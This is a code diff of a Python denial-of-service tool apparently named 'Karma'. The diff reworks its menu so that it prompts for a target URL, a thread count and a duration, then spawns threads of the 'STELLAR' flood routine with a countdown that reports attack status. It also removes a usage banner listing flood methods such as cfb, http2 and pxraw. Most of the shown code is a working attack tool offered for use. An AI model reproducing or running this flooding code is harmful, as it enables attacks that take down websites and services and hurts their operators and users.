@@ -25,25 +25,17 @@ def clear():
     else: 
         system('clear')
 
-def countdown(t):
-    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    while True:
-        if (until - datetime.datetime.now()).total_seconds() > 0:
-            stdout.flush()
-            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
-        else:
-            stdout.flush()
-            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
-            return
+            
+def command():
+    
+    target = input(" • URL : ")
+    thread = input(" • THREAD : ")
+    t = input(" • TIME : ")
+    threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
+    timer = threading.Thread(target=countdown, args=(t,))
+    timer.start()
+    timer.join()
 
-def get_info_l7():
-    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"URL      "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
-    target = input()
-    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
-    thread = input()
-    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
-    t = input()
-    return target, thread, t
 def attackSTELLAR(url, timer, threads):
     for i in range(int(threads)):
         threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()
@@ -75,19 +67,17 @@ def LaunchSTELLAR(url, timer):
                 s.close()
         except:
             s.close()
-            
-def command():
-    stdout.write(Fore.LIGHTCYAN_EX+"╔═══"+Fore.LIGHTCYAN_EX+"[""root"+Fore.LIGHTGREEN_EX+"@"+Fore.LIGHTCYAN_EX+"Karma"+Fore.CYAN+"]"+Fore.LIGHTCYAN_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
-    command = input()
-    if command == "cls" or command == "clear":
-        clear()
-        title()
-    elif command == "sky" or command == "SKY":
-        target, thread, t = get_info_l7()
-        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
-        timer = threading.Thread(target=countdown, args=(t,))
-        timer.start()
-        timer.join()
+
+def countdown(t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    while True:
+        if (until - datetime.datetime.now()).total_seconds() > 0:
+            stdout.flush()
+            stdout.write("\r "+Fore.MAGENTA+"•"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
+        else:
+            stdout.flush()
+            stdout.write("\r "+Fore.MAGENTA+"•"+Fore.WHITE+" Attack Done !                                   \n")
+            return
 
 if __name__ == '__main__':
     init(convert=True)
@@ -99,20 +89,3 @@ if __name__ == '__main__':
             command()
     elif len(sys.argv) == 5:
         pass
-    else:
-        stdout.write("Method: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")
-        stdout.write(f"usage:~# python3 {sys.argv[0]} <method> <target> <thread> <time>\n")
-        sys.exit()
-    ua = open('ua.txt', 'r').read().split('\n')
-    method = sys.argv[1].rstrip()
-    target = sys.argv[2].rstrip()
-    thread = sys.argv[3].rstrip()
-    t      = sys.argv[4].rstrip()
-    if method == "sky":
-        target, thread, t = get_info_l7()
-        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
-        timer = threading.Thread(target=countdown, args=(t,))
-        timer.start()
-        timer.join()
-    else:
-        stdout.write("No method found.\nMethod: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")
